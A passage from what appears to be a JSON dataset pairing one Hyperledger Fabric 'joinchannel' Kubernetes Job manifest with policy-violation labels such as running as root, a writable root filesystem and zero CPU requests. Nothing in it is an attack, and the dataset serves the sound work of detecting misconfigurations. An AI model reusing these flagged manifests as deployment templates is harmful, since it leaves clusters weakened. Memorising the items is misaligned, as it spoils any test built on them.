joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org3peer1:30310\n        - name: CORE_PEER_LOCALMSPID\n          value: Org3MSP\n        - name: CORE_PEER_MSPID\n          value: Org3MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org3.example.com/users/Admin@org3.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org4peer1:30410\n        - name: CORE_PEER_LOCALMSPID\n          value: Org4MSP\n        - name: CORE_PEER_MSPID\n          value: Org4MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org4.example.com/users/Admin@org4.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"joinchannel4\" does not have a read-only root file system"
  },
  {
    "id": "01404",
    "manifest_path": "data/manifests/the_stack_sample/sample_0446.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org1peer1:30110\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_PEER_MSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org2peer1:30210\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_PEER_MSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org3peer1:30310\n        - name: CORE_PEER_LOCALMSPID\n          value: Org3MSP\n        - name: CORE_PEER_MSPID\n          value: Org3MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org3.example.com/users/Admin@org3.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org4peer1:30410\n        - name: CORE_PEER_LOCALMSPID\n          value: Org4MSP\n        - name: CORE_PEER_MSPID\n          value: Org4MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org4.example.com/users/Admin@org4.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"joinchannel1\" is not set to runAsNonRoot"
  },
  {
    "id": "01405",
    "manifest_path": "data/manifests/the_stack_sample/sample_0446.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org1peer1:30110\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_PEER_MSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org2peer1:30210\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_PEER_MSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org3peer1:30310\n        - name: CORE_PEER_LOCALMSPID\n          value: Org3MSP\n        - name: CORE_PEER_MSPID\n          value: Org3MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org3.example.com/users/Admin@org3.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org4peer1:30410\n        - name: CORE_PEER_LOCALMSPID\n          value: Org4MSP\n        - name: CORE_PEER_MSPID\n          value: Org4MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org4.example.com/users/Admin@org4.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"joinchannel2\" is not set to runAsNonRoot"
  },
  {
    "id": "01406",
    "manifest_path": "data/manifests/the_stack_sample/sample_0446.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org1peer1:30110\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_PEER_MSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org2peer1:30210\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_PEER_MSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org3peer1:30310\n        - name: CORE_PEER_LOCALMSPID\n          value: Org3MSP\n        - name: CORE_PEER_MSPID\n          value: Org3MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org3.example.com/users/Admin@org3.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org4peer1:30410\n        - name: CORE_PEER_LOCALMSPID\n          value: Org4MSP\n        - name: CORE_PEER_MSPID\n          value: Org4MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org4.example.com/users/Admin@org4.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"joinchannel3\" is not set to runAsNonRoot"
  },
  {
    "id": "01407",
    "manifest_path": "data/manifests/the_stack_sample/sample_0446.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org1peer1:30110\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_PEER_MSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org2peer1:30210\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_PEER_MSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org3peer1:30310\n        - name: CORE_PEER_LOCALMSPID\n          value: Org3MSP\n        - name: CORE_PEER_MSPID\n          value: Org3MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org3.example.com/users/Admin@org3.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org4peer1:30410\n        - name: CORE_PEER_LOCALMSPID\n          value: Org4MSP\n        - name: CORE_PEER_MSPID\n          value: Org4MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org4.example.com/users/Admin@org4.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"joinchannel4\" is not set to runAsNonRoot"
  },
  {
    "id": "01408",
    "manifest_path": "data/manifests/the_stack_sample/sample_0446.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org1peer1:30110\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_PEER_MSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org2peer1:30210\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_PEER_MSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org3peer1:30310\n        - name: CORE_PEER_LOCALMSPID\n          value: Org3MSP\n        - name: CORE_PEER_MSPID\n          value: Org3MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org3.example.com/users/Admin@org3.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org4peer1:30410\n        - name: CORE_PEER_LOCALMSPID\n          value: Org4MSP\n        - name: CORE_PEER_MSPID\n          value: Org4MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org4.example.com/users/Admin@org4.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"joinchannel1\" has cpu request 0"
  },
  {
    "id": "01409",
    "manifest_path": "data/manifests/the_stack_sample/sample_0446.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org1peer1:30110\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_PEER_MSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org2peer1:30210\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_PEER_MSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org3peer1:30310\n        - name: CORE_PEER_LOCALMSPID\n          value: Org3MSP\n        - name: CORE_PEER_MSPID\n          value: Org3MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org3.example.com/users/Admin@org3.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org4peer1:30410\n        - name: CORE_PEER_LOCALMSPID\n          value: Org4MSP\n        - name: CORE_PEER_MSPID\n          value: Org4MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org4.example.com/users/Admin@org4.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"joinchannel2\" has cpu request 0"
  },
